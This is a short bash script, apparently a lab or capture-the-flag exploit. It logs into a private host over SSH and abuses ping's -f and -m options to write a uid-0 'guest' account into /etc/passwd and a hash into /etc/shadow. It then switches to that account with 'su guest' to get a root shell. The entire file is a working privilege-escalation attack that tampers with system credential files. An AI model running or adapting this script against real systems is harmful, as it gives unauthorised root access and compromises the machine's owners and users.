#!/bin/bash
# Ask the user for their name
echo "please, type your login for 10.0.23.31"
read username
echo '-------------------------------------------'
echo "After typing your password for ssh, when you're asked to type the password, press enter."
ssh -t $username@10.0.23.31 'ping google.com -c 1 -f /etc/passwd -m guest:x:0:0:root:/root:/bin/bash\
 &&\
ping google.com -c 1 -f /etc/shadow -m guest:U6aMy0wojraho::::::: &&\
su guest'

echo "Hope you enjoyed this ride :)"
